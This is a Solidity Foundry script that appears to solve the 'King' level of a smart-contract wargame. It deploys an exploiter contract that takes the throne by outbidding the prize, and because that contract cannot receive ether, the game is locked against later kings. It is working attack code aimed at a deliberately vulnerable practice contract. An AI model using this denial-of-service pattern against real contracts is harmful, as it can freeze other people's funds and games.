pragma solidity ^0.8.0;
import "../instances/Ilevel09.sol";
import "forge-std/Test.sol";

contract Level09 is Test {
    King level09 = King(payable(0x7F58d6a0C69B8e8f0EBF75A0EBFA97e5Fccd068C));

    function test() external {
        uint256 attackerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(attackerPrivateKey);
        KingExploiter exploiter = new KingExploiter();
        uint256 prize = level09.prize();
        exploiter.attack{value: prize + 1}(payable(address(level09)));
        address currentKing = address(
            uint160(uint256(vm.load(address(level09), bytes32(uint256(0)))))
        );
        (bool canTransferToKing, ) = address(currentKing).call{
            value: 0.0001 ether
        }("");
        require(canTransferToKing == false, "still can transfer to king");
        vm.stopBroadcast();
    }
}

contract KingExploiter {
    function attack(address payable _target) public payable {
        King king = King(payable(_target));
        require(msg.value > king.prize(), "value < prize");
        _target.call{value: msg.value}("");
    }
}
